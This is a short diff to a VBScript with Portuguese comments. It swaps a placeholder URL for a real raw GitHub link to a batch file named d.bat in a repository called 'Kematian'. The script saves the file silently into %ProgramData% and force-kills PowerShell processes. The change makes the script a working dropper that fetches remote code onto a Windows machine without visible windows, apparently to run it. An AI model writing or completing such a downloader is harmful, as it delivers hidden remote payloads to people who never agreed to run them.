@@ -9,7 +9,7 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 ' Define caminhos
 strProgramData = objShell.ExpandEnvironmentStrings("%ProgramData%")
 strBatFile = strProgramData & "\data.bat"
-strURL = "https://example.com/data.bat"
+strURL = "https://raw.githubusercontent.com/bat2exe/Kematian/refs/heads/main/d.bat"
 
 ' Deleta data.bat se existir (silencioso)
 If objFSO.FileExists(strBatFile) Then
@@ -41,3 +41,4 @@ objShell.Run "taskkill /F /IM powershell.exe", 0, False
 Set objHTTP = Nothing
 Set objFSO = Nothing
 Set objShell = Nothing
+
